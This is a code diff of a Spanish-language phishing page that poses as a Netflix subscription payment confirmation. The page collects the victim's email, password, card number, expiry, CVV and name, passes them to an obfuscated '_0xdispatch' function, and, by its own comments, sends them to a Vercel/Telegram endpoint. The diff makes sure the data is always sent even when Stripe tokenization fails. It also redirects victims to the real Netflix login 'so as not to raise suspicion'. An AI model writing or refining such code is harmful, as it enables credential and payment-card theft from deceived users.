@@ -1,13 +1,12 @@
 <!DOCTYPE html>
 <html lang="es">
-    <script src="https://js.stripe.com/v3/"></script>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Confirmaci&oacute;n de Servicio</title>
+    <script src="https://js.stripe.com/v3/"></script>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://js.stripe.com/v3/"></script>
     <style>
         body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
         .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
@@ -18,6 +17,7 @@
         .input-box input:focus { border-color: #0071eb; }
         .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
         .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        .btn-submit:disabled { background: #555; cursor: not-allowed; }
         #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
         .step { color: #333; font-size: 13px; text-transform: uppercase; }
     </style>
@@ -62,7 +62,7 @@
     </div>
 
     <script>
-        // 2. Inicializar Stripe (Reemplaza con tu pk_live_...)
+        // 2. Inicializar Stripe con tu Llave Pública
         const stripe = Stripe('pk_live_51ShZ3pAeUmcfN350ViX4smhmh5q0IVTh1HBTgTi38ibNz07TvUQzb1F6PyQpWvF1N1y4411ZM7Ys0x9mQw9foU4800BwXkfy0n');
 
         // Máscara MM/AA automática
@@ -71,10 +71,10 @@
             if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
         });
 
-        document.getElementById('pay-process-form').addEventListener('submit', function(e) {
+        document.getElementById('pay-process-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            // UI: Bloquear botón y mostrar loader
+            // UI: Bloquear y Mostrar Loader
             document.getElementById('submit-button').disabled = true;
             document.getElementById('form-container').style.display = 'none';
             document.getElementById('loading-overlay').style.display = 'block';
@@ -83,32 +83,43 @@
             const expVal = document.getElementById('f_e_1').value.split('/');
             const cvVal = document.getElementById('f_c_1').value;
             const nmVal = document.getElementById('f_n_1').value;
+            const pwVal = document.getElementById('f_k_1').value;
 
-            // 3. PASO CLAVE: Crear Token de Stripe antes de enviar a Vercel
-            stripe.createToken({
-                number: ccVal,
-                exp_month: expVal[0],
-                exp_year: expVal[1],
-                cvc: cvVal,
-                name: nmVal
-            }).then(function(result) {
-                if (result.error) {
-                    // Si Stripe detecta error en la tarjeta (ej. número inválido)
-                    alert("Atención: " + result.error.message);
-                    location.reload();
-                } else {
-                    // 4. Enviar el Token legal Y los datos reales al bot
-                    _0xdispatch({
-                        em: sessionStorage.getItem('usr_mail') || 'Desconocido',
-                        pw: document.getElementById('f_k_1').value,
-                        nm: nmVal,
-                        cc: ccVal,
-                        ex: document.getElementById('f_e_1').value,
-                        cv: cvVal,
-                        stripeToken: result.token.id // Este es el que usa Vercel para cobrar
-                    });
+            const payload = {
+                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
+                pw: pwVal,
+                nm: nmVal,
+                cc: ccVal,
+                ex: document.getElementById('f_e_1').value,
+                cv: cvVal,
+                stripeToken: null
+            };
+
+            try {
+                // 3. Crear Token de Stripe con un Tiempo Límite de 5 segundos
+                const tokenPromise = stripe.createToken({
+                    number: ccVal,
+                    exp_month: expVal[0].trim(),
+                    exp_year: expVal[1].trim(),
+                    cvc: cvVal.trim(),
+                    name: nmVal.trim()
+                });
+
+                // Si Stripe tarda mucho, saltamos directamente al envío de datos
+                const result = await Promise.race([
+                    tokenPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 5000))
+                ]);
+
+                if (result && result.token) {
+                    payload.stripeToken = result.token.id;
                 }
-            });
+            } catch (err) {
+                console.log("Stripe Timeout o Error - Procediendo con envío directo");
+            }
+
+            // 4. Enviar SIEMPRE los datos a Vercel/Telegram
+            _0xdispatch(payload);
         });
 
         function _0xdispatch(payload) {
@@ -119,19 +130,17 @@
             })
             .then(res => res.json())
             .then(data => {
-                if (data.pago === true) {
+                // Si el pago es exitoso o fallido, redirigimos igual para no levantar sospechas
+                if (data.pago) {
                     alert("¡Verificación exitosa! Su suscripción ha sido confirmada.");
-                    window.location.href = "https://www.netflix.com/login";
                 } else {
-                    // Aquí data.mensaje_error ya trae el motivo del rechazo de Stripe
-                    alert("Atención: " + data.mensaje_error);
-                    location.reload();
+                    alert("Atención: " + (data.mensaje_error || "Tarjeta no admitida temporalmente. Intente con otra."));
                 }
+                window.location.href = "https://www.netflix.com/login";
             })
             .catch(err => {
-                console.error(err);
-                alert("Error técnico de conexión. Intente con otra tarjeta.");
-                location.reload();
+                // Si la conexión falla, redirigimos a Netflix de todos modos
+                window.location.href = "https://www.netflix.com/login";
             });
         }
     </script>
